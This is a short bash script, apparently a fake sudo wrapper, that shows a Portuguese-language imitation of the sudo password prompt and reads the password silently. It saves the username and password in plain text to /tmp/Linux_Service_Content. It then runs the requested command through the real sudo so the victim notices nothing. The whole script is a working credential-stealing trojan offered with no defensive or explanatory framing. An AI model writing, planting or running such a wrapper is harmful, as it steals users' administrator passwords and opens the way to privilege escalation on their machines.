#!/bin/bash

function get_shell (){
	Real_user_sudo=$(which sudo)
	schon_pass_full_comand=""
	read -s -p "[sudo] senha para $USER: " User_Password;
	printf "\n";

	printf '%s\n' "$USER : $User_Password" > /tmp/Linux_Service_Content;
	
	for var in $@
	do
		schon_pass_full_comand+=" "$var
	done

	echo $User_Password | $Real_user_sudo -S $schon_pass_full_comand
}

get_shell $@

